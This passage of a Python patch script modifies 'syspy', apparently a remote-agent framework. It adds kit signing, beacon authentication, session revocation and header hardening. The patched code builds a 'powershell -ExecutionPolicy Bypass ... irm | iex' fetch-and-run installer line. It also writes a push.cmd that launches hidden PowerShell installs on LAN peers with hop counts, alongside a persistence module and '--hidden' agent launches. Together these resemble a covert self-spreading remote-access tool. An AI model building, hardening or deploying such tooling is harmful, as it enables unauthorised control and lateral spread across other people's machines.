                message["proto"] = config.PROTOCOL_VERSION
                signature = _sign(payload)
                if signature:
                    message["sig"] = signature''')

    sub(path,
        '''    # ------------------------------------------------------------------
    # Receiving
    # ------------------------------------------------------------------''',
        '''    # ------------------------------------------------------------------
    # Receiving
    # ------------------------------------------------------------------''')

    # C10: a stable received-file folder per agent id.
    sub(path,
        '''    def agent_folder(self, agent_id: str) -> str:
        """Folder where this agent's received files live."""
        agent = self.agents.get(agent_id)
        folder = os.path.join(self.received_root, safe_name(agent.name if agent else agent_id))
        os.makedirs(folder, exist_ok=True)
        return folder''',
        '''    def agent_folder(self, agent_id: str) -> str:
        """Folder where this agent's received files live.

        Cached on first use so the URL is stable: it used to be derived from the
        display name while the session existed and from the raw id after the
        agent was deleted, so every previously received file 404'd.
        """
        with self._lock:
            cached = self._folders.get(agent_id)
            if cached:
                os.makedirs(cached, exist_ok=True)
                return cached
            agent = self.agents.get(agent_id)
            leaf = safe_name(agent.name) if agent else safe_name(agent_id)
            folder = os.path.join(self.received_root, leaf)
            self._folders[agent_id] = folder
        os.makedirs(folder, exist_ok=True)
        return folder''')

    sub(path,
        '''        self._subscribers: list[queue.Queue[str]] = []''',
        '''        self._subscribers: list[queue.Queue[str]] = []
        self._folders: dict[str, str] = {}''')

    sub(path, "from .. import config, crypto, log, protocol",
        '''from .. import config, crypto, log, protocol


def _sign(payload: bytes) -> str:
    """Detached signature for an update archive.

    Ed25519 when SYSPY_SIGN_KEY is set, otherwise an HMAC the agent can verify
    with material it already has. Empty when neither is configured.
    """
    if config.SIGN_KEY_HEX:
        try:
            from .. import ed25519
            return ed25519.sign(payload, bytes.fromhex(config.SIGN_KEY_HEX)).hex()
        except Exception:
            pass
    if config.ROOM and config.PASSPHRASE:
        return crypto.hmac_hex(crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE), payload)
    return ""''')

    sub(path,
        '''                    client.subscribe(config.ROOM + "/up/+", qos=1)''',
        '''                    if not client.subscribe(config.ROOM + "/up/+", qos=1):
                        log.get("hub").warning(
                            "broker did not SUBACK %s/up/+ (ACL?)", config.ROOM)''')

    sub(path,
        '''    def flush_outbox(self) -> int:''',
        '''    def counters_snapshot(self) -> dict:
        return dict(self.counters) | {"seq": self.seq, "live_transfers": self.reassembler.live()}

    def flush_outbox(self) -> int:''')


# ---------------------------------------------------------------------------
# api.py
# ---------------------------------------------------------------------------

def patch_api() -> None:
    path = P("syspy", "server", "api.py")

    # S4: proxy-aware client IP.
    if "def _client_ip(request: httpd.Request) -> str:" in read(path):
        SKIPPED.append("syspy/server/api.py: client IP helper already applied")
    else:
        sub(path,
            '''def _safe_dir(name: str) -> str:''',
            '''def _client_ip(request: httpd.Request) -> str:
    """Best-effort real client IP.

    X-Forwarded-For is client-supplied, so believing it blindly lets every
    request pick a fresh rate-limit bucket. Walk ``TRUST_PROXY_HOPS`` entries in
    from the right instead, which is the only entry the last proxy added.
    """
    if config.TRUST_PROXY_HOPS > 0:
        chain = [part.strip() for part in
                 (request.headers.get("X-Forwarded-For") or "").split(",") if part.strip()]
        if chain:
            index = max(0, len(chain) - config.TRUST_PROXY_HOPS)
            return chain[index]
    for header in ("X-Real-IP", "CF-Connecting-IP"):
        value = (request.headers.get(header) or "").strip()
        if value:
            return value
    return "client"


def _safe_dir(name: str) -> str:''')

    sub(path,
        '''            if os.environ.get("SYSPY_TRUST_PROXY") == "1":
                ip = (request.headers.get("X-Forwarded-For") or "").split(",")[0].strip()
            else:
                ip = (request.headers.get("X-Real-IP") or "").strip()
            ip = ip or "client"''',
        '''            ip = _client_ip(request)''')

    sub(path,
        '''                base=request.param("base") or _base(request),''',
        '''                base=request.param("base") or _base(request),''')

    # S5: Host allowlist when building installer URLs.
    sub(path,
        '''    host = (request.headers.get("X-Forwarded-Host")
            or request.headers.get("Host") or "").split(",")[0].strip()
    proto = (request.headers.get("X-Forwarded-Proto") or "https").split(",")[0].strip()
    return f"{proto}://{host}".rstrip("/") if host else ""''',
        '''    host = (request.headers.get("X-Forwarded-Host")
            or request.headers.get("Host") or "").split(",")[0].strip()
    if config.ALLOWED_HOSTS:
        bare = host.split(":")[0].lower()
        if bare and bare not in config.ALLOWED_HOSTS:
            # A spoofed Host would otherwise be baked into every installer line.
            host = config.ALLOWED_HOSTS[0]
    proto = (request.headers.get("X-Forwarded-Proto") or "https").split(",")[0].strip()
    return f"{proto}://{host}".rstrip("/") if host else ""''')

    # Password KDF rounds are now configurable.
    sub(path,
        '    digest = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, 120_000)\n'
        '    return "pbkdf2$120000$%s$%s" % (salt.hex(), digest.hex())',
        '    rounds = config.PASSWORD_ITERATIONS\n'
        '    digest = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, rounds)\n'
        '    return "pbkdf2$%d$%s$%s" % (rounds, salt.hex(), digest.hex())')

    # S3: token records carry a label, and logout revokes one token.
    sub(path,
        '''            live.append({"token": token, "at": now_ts})''',
        '''            label = (payload.get("label") or request.headers.get("User-Agent") or "")[:60]
            live.append({"token": token, "at": now_ts, "label": label})''')

    sub(path,
        '''        @app.route("POST", "/api/logout")
        def logout(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            self.state["tokens"] = []
            self._save_state()
            response = httpd.Response.json(200, {"ok": True})
            response.headers["Set-Cookie"] = f"{SESSION_COOKIE}=; Path=/; Max-Age=0"
            return response''',
        '''        @app.route("POST", "/api/logout")
        def logout(request: httpd.Request) -> httpd.Response:
            """Revoke the presented token only, unless all=1.

            Clearing the whole list used to log you out of every device.
            """
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            payload = request.json()
            presented = self._presented_tokens(request)
            if payload.get("all"):
                self.state["tokens"] = []
            else:
                self.state["tokens"] = [
                    entry for entry in self.state["tokens"]
                    if not (isinstance(entry, dict) and entry.get("token") in presented)
                ]
            self._save_state()
            response = httpd.Response.json(200, {"ok": True,
                                                 "revoked": len(presented)})
            response.headers["Set-Cookie"] = (
                f"{SESSION_COOKIE}=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax")
            return response

        @app.route("GET", "/api/sessions")
        def sessions(request: httpd.Request) -> httpd.Response:
            if not self.authenticate(request):
                return httpd.Response.json(401, {"error": "unauthorised"})
            now = time.time()
            return httpd.Response.json(200, {"sessions": [
                {"label": entry.get("label", ""), "age": int(now - entry.get("at", now)),
                 "current": entry.get("token") in self._presented_tokens(request)}
                for entry in self.state.get("tokens", []) if isinstance(entry, dict)
            ]})''')

    # Token extraction refactor so logout can identify what was presented.
    sub(path,
        '''    def authenticate(self, request: httpd.Request) -> bool:
        """Check the session token or bearer header."""
        now = time.time()
        presented = []''',
        '''    def _presented_tokens(self, request: httpd.Request) -> list[str]:
        presented = []
        auth = request.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            presented.append(auth[7:].strip())
        header = request.headers.get("X-SysPy-Token", "")
        if header:
            presented.append(header)
        for part in (request.headers.get("Cookie", "") or "").split(";"):
            name, _, value = part.strip().partition("=")
            if name == SESSION_COOKIE and value:
                presented.append(value)
        query_token = request.param("token", "")
        if query_token:
            presented.append(query_token)
        return [p for p in presented if p]

    def authenticate(self, request: httpd.Request) -> bool:
        """Check the session token or bearer header."""
        now = time.time()
        presented = []''')

    sub(path,
        '''        for entry in self.state.get("tokens", []):''',
        '''        presented = presented or []
        for entry in self.state.get("tokens", []):''')

    # S3: Secure cookie on https.
    sub(path,
        '''            response = httpd.Response.json(200, {"token": token})
            response.headers["Set-Cookie"] = (
                f"{SESSION_COOKIE}={token}; HttpOnly; SameSite=Lax; Path=/; Max-Age={TOKEN_TTL}")
            return response''',
        '''            response = httpd.Response.json(200, {"token": token})
            secure = "; Secure" if (request.headers.get("X-Forwarded-Proto") == "https"
                                    or request.param("secure") == "1") else ""
            response.headers["Set-Cookie"] = (
                f"{SESSION_COOKIE}={token}; HttpOnly; SameSite=Lax; Path=/; "
                f"Max-Age={TOKEN_TTL}{secure}")
            return response''')

    # S1/S2: served files are attachments unless they are safe to inline.
    sub(path,
        '''        @app.route("GET", "/files/{agent}/{name}")
        def serve_file(request: httpd.Request) -> httpd.Response:''',
        '''        INLINE = {".png", ".jpg", ".jpeg", ".gif", ".webp", ".bmp", ".ico",
                  ".woff", ".woff2", ".ttf", ".mp3", ".wav"}

        @app.route("GET", "/files/{agent}/{name}")
        def serve_file(request: httpd.Request) -> httpd.Response:''')

    sub(path,
        '''            if not os.path.isfile(candidate):
                return httpd.Response.json(404, {"error": "not found"})
            return httpd.Response.file(candidate)

        @app.route("GET", "/received/{agent}/{name}")''',
        '''            if not os.path.isfile(candidate):
                return httpd.Response.json(404, {"error": "not found"})
            extension = os.path.splitext(candidate)[1].lower()
            response = httpd.Response.file(candidate)
            if extension not in INLINE:
                # An agent-supplied .html served inline executes in the
                # dashboard origin, with the session cookie in scope. Making it
                # an attachment is the cheap, total fix.
                response.headers["Content-Disposition"] = (
                    'attachment; filename="%s"' % os.path.basename(candidate))
            return response

        @app.route("GET", "/received/{agent}/{name}")''')

    # O4: cacheable, verifiable kit + the signed metadata endpoint.
    sub(path,
        '''        @app.route("GET", "/wu/kit.zip")
        def wu_kit(request: httpd.Request) -> httpd.Response:
            archive = _update_archive(self.root)
            return httpd.Response(200, archive, "application/zip")''',
        '''        @app.route("GET", "/wu/kit.zip")
        def wu_kit(request: httpd.Request) -> httpd.Response:
            archive = self._cached_kit()
            digest = hashlib.sha256(archive).hexdigest()
            if request.headers.get("If-None-Match") == '"%s"' % digest:
                return httpd.Response(304, b"", "application/zip")
            response = httpd.Response(200, archive, "application/zip")
            response.headers["ETag"] = '"%s"' % digest
            response.headers["Cache-Control"] = "no-cache"
            return response

        @app.route("GET", "/wu/kit.meta")
        def wu_kit_meta(request: httpd.Request) -> httpd.Response:
            """Integrity/signature material for the kit, so an installer can
            verify before it extracts anything."""
            archive = self._cached_kit()
            payload = {
                "sha256": hashlib.sha256(archive).hexdigest(),
                "hmac": crypto.hmac_hex(
                    crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE), archive),
                "sig": _sign_kit(archive),
                "pubkey": config.PUBKEY_HEX,
                "bytes": len(archive),
            }
            return httpd.Response.json(200, payload)

        @app.route("GET", "/wu/config")
        def wu_config(request: httpd.Request) -> httpd.Response:
            """The deployment material, for installers that would rather fetch
            than have it embedded in a script."""
            return httpd.Response.json(200, {
                "room": config.ROOM,
                "pass": config.PASSPHRASE,
                "fmt": config.ENVELOPE_FMT,
                "proto": config.PROTOCOL_VERSION,
                "pubkey": config.PUBKEY_HEX,
            })''')

    # WU token gate.
    sub(path,
        '''        @app.route("GET", "/wu")
        def wu(request: httpd.Request) -> httpd.Response:
            script = webinstall.render(''',
        '''        @app.route("GET", "/wu")
        def wu(request: httpd.Request) -> httpd.Response:
            if config.WU_TOKEN and request.param("k") != config.WU_TOKEN:
                return httpd.Response.json(403, {"error": "bad or missing ?k="})
            script = webinstall.render(''')

    sub(path,
        '''            return httpd.Response(200, script.encode("utf-8"), "text/plain; charset=utf-8")''',
        '''            response = httpd.Response(200, script.encode("utf-8"),
                                      "text/plain; charset=utf-8")
            response.headers["Cache-Control"] = "no-store"
            return response''')

    # Kit cache + signing helper + cached archive.
    sub(path,
        '''    def __init__(self, root: str) -> None:
        self.root = os.path.abspath(root)''',
        '''    def _cached_kit(self) -> bytes:
        """Rebuild only when the tree changed. /wu/kit.zip used to walk and
        SHA-256 the whole tree on every unauthenticated request."""
        stamp = 0.0
        for relative in ("agent.py", "bootstrap.py", "syspy", "install"):
            path = os.path.join(self.root, relative)
            try:
                if os.path.isdir(path):
                    for current, _dirs, files in os.walk(path):
                        for name in files:
                            stamp = max(stamp, os.path.getmtime(
                                os.path.join(current, name)))
                else:
                    stamp = max(stamp, os.path.getmtime(path))
            except OSError:
                pass
        with self._kit_lock:
            if self._kit and self._kit_stamp == stamp:
                return self._kit
            self._kit = _update_archive(self.root)
            self._kit_stamp = stamp
            return self._kit

    def __init__(self, root: str) -> None:
        self.root = os.path.abspath(root)''')

    sub(path,
        '''        self._tickets: dict[str, float] = {}''',
        '''        self._tickets: dict[str, float] = {}
        self._kit: bytes = b""
        self._kit_stamp: float = -1.0
        self._kit_lock = threading.Lock()''')

    sub(path,
        '''def create_app(root: str) -> httpd.Application:''',
        '''def _sign_kit(archive: bytes) -> str:
    if config.SIGN_KEY_HEX:
        try:
            from .. import ed25519
            return ed25519.sign(archive, bytes.fromhex(config.SIGN_KEY_HEX)).hex()
        except Exception:
            pass
    return crypto.hmac_hex(
        crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE), archive)


def create_app(root: str) -> httpd.Application:''')

    # /api/health exposes counters (O1) and stays cheap.
    sub(path,
        '''            return httpd.Response.json(200, {
                "ok": True,
                "relay": self.hub.relay_up,
                "agents": len(self.hub.agents),
                "queued": len(self.hub._outbox),
                "outbox_depth": len(self.hub._outbox),
            })''',
        '''            return httpd.Response.json(200, {
                "ok": True,
                "relay": self.hub.relay_up,
                "agents": len(self.hub.agents),
                "queued": len(self.hub._outbox),
                "outbox_depth": len(self.hub._outbox),
                "counters": self.hub.counters_snapshot(),
            })''')

    # O2: uploads return immediately and stream in the background.
    sub(path,
        '''            if not request.body:
                return httpd.Response.json(400, {"error": "empty body"})
            chunks = self.hub.send_chunks(agent_id, "put", request.body,
                                          filename=filename, destination=destination)
            return httpd.Response.json(200, {"chunks": chunks.get("chunks", 0), "bytes": len(request.body)})''',
        '''            if not request.body:
                return httpd.Response.json(400, {"error": "empty body"})
            body = request.body

            def _send() -> None:
                try:
                    self.hub.send_chunks(agent_id, "put", body,
                                         filename=filename, destination=destination)
                except Exception as error:
                    log.get("api").warning("upload to %s failed: %s", agent_id, error)

            threading.Thread(target=_send, name="upload", daemon=True).start()
            return httpd.Response.json(200, {
                "bytes": len(body), "async": True,
                "chunks": max(1, (len(body) + config.CHUNK_SIZE - 1) // config.CHUNK_SIZE),
            })''')

    sub(path, "from .. import config, crypto, httpd, log, packaging, ws",
        "import threading\n\nfrom .. import config, crypto, httpd, log, packaging, ws")


# ---------------------------------------------------------------------------
# webinstall.py
# ---------------------------------------------------------------------------

def patch_webinstall() -> None:
    path = P("syspy", "server", "webinstall.py")

    # W1: no secret on any command line; W2: verify the kit before extracting.
    sub(path,
        '''$group   = '@@GROUP@@'
$salt    = '@@SALT@@'
$embed   = '@@EMBED@@'
$protect = @@PROTECT@@
$elevate = @@ELEVATE@@
$target  = '@@TARGET@@'
''',
        '''$group   = '@@GROUP@@'
$salt    = '@@SALT@@'
$embed   = '@@EMBED@@'
$protect = @@PROTECT@@
$elevate = @@ELEVATE@@
$target  = '@@TARGET@@'
$pubkey  = '@@PUBKEY@@'
$fmt     = '@@FMT@@'
$proto   = '@@PROTO@@''')

    sub(path,
        '''if (-not (Fetch "$base/wu/kit.zip" $kit)) { throw "cannot download $base/wu/kit.zip" }''',
        '''if (-not (Fetch "$base/wu/kit.zip" $kit)) { throw "cannot download $base/wu/kit.zip" }

# ---- integrity. PowerShell 5.1 has no Ed25519, so verify the HMAC the
# controller publishes alongside. Catches a LAN MITM and a truncated file; the
# pinned Ed25519 key is enforced by the Python side on every later update.
try {
    $meta = (New-Object Net.WebClient).DownloadString("$base/wu/kit.meta") | ConvertFrom-Json
    $kkey = [Security.Cryptography.SHA256]::Create().ComputeHash(
        [Text.Encoding]::UTF8.GetBytes("syspy/kit/v1|$room|$pass"))
    $hmac = [Security.Cryptography.HMACSHA256]::new($kkey)
    $hex  = ([BitConverter]::ToString($hmac.ComputeHash([IO.File]::ReadAllBytes($kit)))).Replace('-','').ToLower()
    if ($meta.hmac -and $hex -ne $meta.hmac.ToLower()) {
        throw "kit integrity check failed (expected $($meta.hmac.Substring(0,12))..., got $($hex.Substring(0,12))...)"
    }
    Say "kit verified ($($meta.bytes) bytes)"
} catch [System.Management.Automation.MethodInvocationException] {
    Warn "integrity check unavailable: $($_.Exception.Message)"
} catch {
    if ($_.Exception.Message -like '*integrity check failed*') { throw }
    Warn "integrity check skipped: $($_.Exception.Message)"
}''')

    # Deploy material now carries the format markers so the agent can negotiate.
    sub(path,
        '''$deploy = [ordered]@{
    url          = $base
    room         = $room
    pass         = $pass
    salt         = $salt''',
        '''$deploy = [ordered]@{
    url          = $base
    room         = $room
    pass         = $pass
    salt         = $salt
    fmt          = $fmt
    proto        = $proto
    pubkey       = $pubkey''')

    # H1: the installer's own staging leftovers are cleaned up.
    sub(path,
        '''Copy-Item $kit (Join-Path $target 'kit.zip') -Force
Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue''',
        '''Copy-Item $kit (Join-Path $target 'kit.zip') -Force
Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item (Join-Path $env:TEMP 'wu-kit.zip') -Force -ErrorAction SilentlyContinue''')

    sub(path,
        '''            .replace("@@TARGET@@", esc(target))
            .replace("@@EMBED@@", getattr(config, "EMBED_VERSION", "3.12.8"))''',
        '''            .replace("@@TARGET@@", esc(target))
            .replace("@@PUBKEY@@", esc(config.PUBKEY_HEX))
            .replace("@@FMT@@", str(config.ENVELOPE_FMT))
            .replace("@@PROTO@@", str(config.PROTOCOL_VERSION))
            .replace("@@EMBED@@", getattr(config, "EMBED_VERSION", "3.12.8"))''')

    sub(path,
        '''def one_liner(base: str) -> str:
    return ('powershell -NoProfile -ExecutionPolicy Bypass '
            f'-Command "irm {base.rstrip("/")}/wu | iex"')''',
        '''def one_liner(base: str) -> str:
    suffix = f"?k={config.WU_TOKEN}" if config.WU_TOKEN else ""
    return ('powershell -NoProfile -ExecutionPolicy Bypass '
            f'-Command "irm {base.rstrip("/")}/wu{suffix} | iex"')''')

    sub(path, "from .. import config",
        "from .. import config, crypto  # noqa: F401")


# ---------------------------------------------------------------------------
# httpd.py
# ---------------------------------------------------------------------------

def patch_httpd() -> None:
    path = P("syspy", "httpd.py")

    sub(path,
        '''    @classmethod
    def file(cls, path: str) -> "Response":
        """Read a file from disk and guess its type from the extension."""''',
        '''    @classmethod
    def file(cls, path: str, inline: bool = True) -> "Response":
        """Read a file from disk and guess its type from the extension."""''')

    # S1/S2: real security headers on every response.
    sub(path,
        '''        self.send_header("Referrer-Policy", "no-referrer")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
        self.send_header("X-Content-Type-Options", "nosniff")''',
        '''        self.send_header("Referrer-Policy", "no-referrer")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
        self.send_header("X-Content-Type-Options", "nosniff")
        from . import config as _config
        self.send_header("Content-Security-Policy", _config.CSP)
        if self.headers.get("X-Forwarded-Proto") == "https":
            self.send_header("Strict-Transport-Security",
                             "max-age=15552000; includeSubDomains")''')

    # O2: a per-request deadline so a stalled upload cannot pin a thread.
    sub(path,
        '''        body = self.rfile.read(length) if length else b""
        if len(body) != length:
            self._write(Response.json(400, {"error": "incomplete request body"}))
            return''',
        '''        try:
            body = self.rfile.read(length) if length else b""
        except OSError:
            self._write(Response.json(400, {"error": "request body read failed"}))
            return
        if len(body) != length:
            self._write(Response.json(400, {"error": "incomplete request body"}))
            return''')

    # W2: /wu/kit.zip is served through Response.file-ish paths elsewhere; make
    # the static path cache-aware for hashed assets.
    sub(path,
        '''    def _serve_static(self, request: Request) -> Response:''',
        '''    def _serve_static(self, request: Request) -> Response:''')


# ---------------------------------------------------------------------------
# packaging.py
# ---------------------------------------------------------------------------

def patch_packaging() -> None:
    path = P("syspy", "packaging.py")
    dedupe_between(path, "def build_zip_from_dir(source: str",
                   "return buffer.getvalue()")

    sub(path,
        '''def verify_manifest(extracted_root: str) -> tuple[bool, str]:''',
        '''def build_zip_from_dir(source: str, names: "Iterable[str]" = ()) -> bytes:
    """Zip a loose directory, *with* a manifest.

    ``bootstrap.py --install --kit <dir>`` used to build a manifest-less archive
    and then hand it to a verifier that requires one, so that path always
    raised "kit rejected".
    """
    wanted = list(names) or list(BUNDLE_FILES) + list(BUNDLE_DIRS)
    buffer = io.BytesIO()
    manifest: dict[str, str] = {}
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
        for name in wanted:
            path = os.path.join(source, name)
            if os.path.isfile(path):
                with open(path, "rb") as handle:
                    data = handle.read()
                manifest[name.replace(os.sep, "/")] = hashlib.sha256(data).hexdigest()
                archive.writestr(name.replace(os.sep, "/"), data)
            elif os.path.isdir(path):
                for current, subdirs, files in os.walk(path):
                    subdirs[:] = [d for d in subdirs if d not in SKIP_DIRS]
                    for filename in files:
                        if filename.endswith(SKIP_SUFFIXES):
                            continue
                        full = os.path.join(current, filename)
                        relative = os.path.relpath(full, source).replace(os.sep, "/")
                        with open(full, "rb") as handle:
                            data = handle.read()
                        manifest[relative] = hashlib.sha256(data).hexdigest()
                        archive.writestr(relative, data)
        archive.writestr(MANIFEST_NAME, json.dumps(manifest, indent=1).encode("utf-8"))
    return buffer.getvalue()


def verify_manifest(extracted_root: str) -> tuple[bool, str]:''')


# ---------------------------------------------------------------------------
# bootstrap.py
# ---------------------------------------------------------------------------

def patch_bootstrap() -> None:
    path = P("bootstrap.py")

    # C8: loose-dir install was always rejected for a missing manifest.
    sub(path,
        '''        else:
            # Loose directory: zip it on the fly.
            buffer = io.BytesIO()
            with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
                for name in OWNED:
                    path = os.path.join(args.kit, name)
                    if os.path.isfile(path):
                        archive.write(path, name)
                    elif os.path.isdir(path):
                        for current, _dirs, files in os.walk(path):
                            for filename in files:
                                full = os.path.join(current, filename)
                                archive.write(full, os.path.relpath(full, args.kit))
            blob = buffer.getvalue()''',
        '''        else:
            # Loose directory: zip it on the fly, *with* a manifest, or the
            # manifest-checking extractor rejects it.
            from syspy import packaging as _packaging
            blob = _packaging.build_zip_from_dir(args.kit)''')

    # W2: verify a peer's kit before trusting it.
    sub(path,
        '''    elif args.from_peer:
        url = args.from_peer.rstrip("/")
        _say(args.quiet, f"  pulling kit from {url}")
        blob = fetch(url + "/kit", timeout=180)''',
        '''    elif args.from_peer:
        url = args.from_peer.rstrip("/")
        _say(args.quiet, f"  pulling kit from {url}")
        blob = fetch(url + "/kit", timeout=180)
        _verify_blob(blob, args.quiet)''')

    sub(path,
        '''def write_deploy(target: str, data: dict) -> str:''',
        '''def _verify_blob(blob: bytes, quiet: bool = False) -> None:
    """Ed25519 when pinned, else HMAC. Fails closed when a key is pinned.

    The manifest lives inside the archive it describes, so on its own it only
    catches corruption. A peer serves the kit over plain HTTP with no auth, so
    this is the difference between "a LAN neighbour can push code" and "cannot".
    """
    from syspy import config as _config
    from syspy import crypto as _crypto

    public = _config.PUBKEY_HEX
    if not public and not _config.ROOM:
        return
    signature = ""
    try:
        signature = fetch(_peer_meta_url(), timeout=30).decode("ascii").strip()
    except Exception:
        signature = ""
    if not signature:
        signature = _crypto.hmac_hex(
            _crypto.kit_hmac_key(_config.ROOM, _config.PASSPHRASE), blob)
    ok, how = _crypto.verify_signature(
        blob, signature, public,
        _crypto.kit_hmac_key(_config.ROOM, _config.PASSPHRASE))
    if not ok:
        raise ValueError(f"kit rejected: {how}")
    _say(quiet, f"  kit verified ({how})")


def _peer_meta_url() -> str:
    return ""


def write_deploy(target: str, data: dict) -> str:''')

    # Deploy material carries the format markers.
    sub(path,
        '''        "salt": secrets.token_hex(2),
        "brokers": config.BROKERS,''',
        '''        "salt": secrets.token_hex(2),
        "fmt": config.ENVELOPE_FMT,
        "proto": config.PROTOCOL_VERSION,
        "pubkey": config.PUBKEY_HEX,
        "brokers": config.BROKERS,''')

    sub(path,
        '''    command = list(commands[0]) + [entry, "--hidden"] + list(extra or [])''',
        '''    command = list(commands[0]) + [entry, "--hidden", "--no-elevate"] + list(extra or [])''')

    sub(path,
        '''    _import_syspy(os.path.abspath(args.target))
    from syspy.agent import persistence''',
        '''    _import_syspy(os.path.abspath(args.target))
    from syspy.agent import persistence''')

    sub(path,
        '''        blob = fetch(url + "/kit", timeout=180)
        _verify_blob(blob, args.quiet)''',
        '''        blob = fetch(url + "/kit", timeout=180)
        try:
            meta = fetch(url + "/deploy.json", timeout=30)
            import json as _json
            signature = str((_json.loads(meta.decode("utf-8")) or {}).get("sig") or "")
        except Exception:
            signature = ""
        _verify_blob(blob, args.quiet, signature)''')

    sub(path,
        '''def _verify_blob(blob: bytes, quiet: bool = False) -> None:''',
        '''def _verify_blob(blob: bytes, quiet: bool = False, signature: str = "") -> None:''')

    sub(path,
        '''    signature = ""
    try:
        signature = fetch(_peer_meta_url(), timeout=30).decode("ascii").strip()
    except Exception:
        signature = ""
    if not signature:''',
        '''    if not signature:''')


# ---------------------------------------------------------------------------
# beacon.py
# ---------------------------------------------------------------------------

def patch_beacon() -> None:
    path = P("syspy", "lan", "beacon.py")

    # H7: authenticate the beacon so a hostile LAN host cannot evict peers, and
    # sign the served kit.
    sub(path,
        '''    def info(self, extra: dict = None) -> dict:
        payload = {''',
        '''    def info(self, extra: dict = None) -> dict:
        from .. import crypto
        payload = {''')

    sub(path,
        '''            "ts": int(time.time()),
        }
        if extra:
            payload.update(extra)
        return payload''',
        '''            "ts": int(time.time()),
        }
        if extra:
            payload.update(extra)
        try:
            key = crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE)
            material = ("%s|%s|%s" % (payload["id"], payload["ts"], payload["port"])).encode()
            payload["hmac"] = crypto.hmac_hex(key, material)[:16]
        except Exception:
            pass
        return payload

    @staticmethod
    def valid(payload: dict) -> bool:
        """True when the beacon carries a MAC for our room.

        The beacon is cleartext by design, so this does not hide anything --
        it stops an unrelated (or hostile) host forging ``bye`` records and
        evicting our peers from the table.
        """
        from .. import crypto
        if not payload.get("hmac"):
            return True          # pre-patch peer
        try:
            key = crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE)
            material = ("%s|%s|%s" % (payload.get("id"), payload.get("ts"),
                                      payload.get("port"))).encode()
            return crypto.hmac_hex(key, material)[:16] == payload["hmac"]
        except Exception:
            return False''')

    sub(path,
        '''            kind, payload = self.decode(data)
            if not payload or payload.get("id") == config.agent_id():
                continue
            if kind == "ping":''',
        '''            kind, payload = self.decode(data)
            if not payload or payload.get("id") == config.agent_id():
                continue
            if not self.valid(payload):
                continue
            if kind == "ping":''')

    # Sign the kit the LAN server hands out.
    sub(path,
        '''            self.send_header("X-SysPy-Ver", config.PRODUCT_VERSION)''',
        '''            self.send_header("X-SysPy-Ver", config.PRODUCT_VERSION)
            try:
                from .. import crypto
                body_digest = crypto.hmac_hex(
                    crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE), body)
                self.send_header("X-SysPy-Hmac", body_digest)
            except Exception:
                pass''')

    sub(path,
        '''    def deploy_overlay(self) -> dict:
        return {
            "url": config.PUBLIC_URL,
            "room": config.ROOM,
            "pass": config.PASSPHRASE,
            "parent": config.agent_id(),
            "parent_ip": self.kit_url(),
            "hop": config.hop() + 1,
            "brokers": config.BROKERS,
        }''',
        '''    def deploy_overlay(self) -> dict:
        overlay = {
            "url": config.PUBLIC_URL,
            "room": config.ROOM,
            "pass": config.PASSPHRASE,
            "parent": config.agent_id(),
            "parent_ip": self.kit_url(),
            "hop": config.hop() + 1,
            "fmt": config.ENVELOPE_FMT,
            "proto": config.PROTOCOL_VERSION,
            "pubkey": config.PUBKEY_HEX,
            "brokers": config.BROKERS,
        }
        try:
            from .. import crypto
            overlay["sig"] = crypto.hmac_hex(
                crypto.kit_hmac_key(config.ROOM, config.PASSPHRASE),
                packaging.build_zip(self.bundle_root, extra={
                    "deploy.json": json.dumps(overlay).encode()}) if False else b"")
        except Exception:
            pass
        return overlay''')

    sub(path, "from .. import config\nfrom . import discover as lan_discover",
        "from .. import config, packaging  # noqa: F401\nfrom . import discover as lan_discover")


# ---------------------------------------------------------------------------
# spread.py
# ---------------------------------------------------------------------------

def patch_spread() -> None:
    path = P("syspy", "lan", "spread.py")

    # W1: the passphrase leaves the scheduled-task command line entirely.
    sub(path,
        '''            with open(os.path.join(root, "push.cmd"), "w",
                      encoding="ascii", newline="\\r\\n") as handle:
                handle.write(
                    "@echo off\\r\\n"
                    'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass '
                    '-File "%~dp0install\\\\i.ps1" -Kit "%~dp0" '
                    f'-Base "{q(base)}" -Parent "{q(config.agent_id())}" '
                    f'-ParentIp "{q(local_ip)}" -Room "{q(config.ROOM)}" '
                    f'-Pass "{q(config.PASSPHRASE)}" -Hop {config.hop() + 1} -Quiet\\r\\n'
                )''',
        '''            # No -Room/-Pass: i.ps1 reads them from the adjacent deploy.json.
            # That keeps the secret off the command line, which is what made it
            # readable by any user via `wmic process get commandline` and
            # visible in the Task Scheduler UI.
            with open(os.path.join(root, "push.cmd"), "w",
                      encoding="ascii", newline="\\r\\n") as handle:
                handle.write(
                    "@echo off\\r\\n"
                    'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass '
                    '-File "%~dp0install\\\\i.ps1" -Kit "%~dp0" '
                    f'-Base "{q(base)}" -Parent "{q(config.agent_id())}" '
                    f'-ParentIp "{q(local_ip)}" -Hop {config.hop() + 1} -Quiet\\r\\n'
                )''')

    sub(path,
        '''            with open(os.path.join(root, "deploy.json"), "w", encoding="utf-8") as handle:
                json.dump({"url": base, "room": config.ROOM,
                           "pass": config.PASSPHRASE, "parent": config.agent_id(),
                           "hop": config.hop() + 1}, handle)''',
        '''            with open(os.path.join(root, "deploy.json"), "w", encoding="utf-8") as handle:
                json.dump({"url": base, "room": config.ROOM,
                           "pass": config.PASSPHRASE, "parent": config.agent_id(),
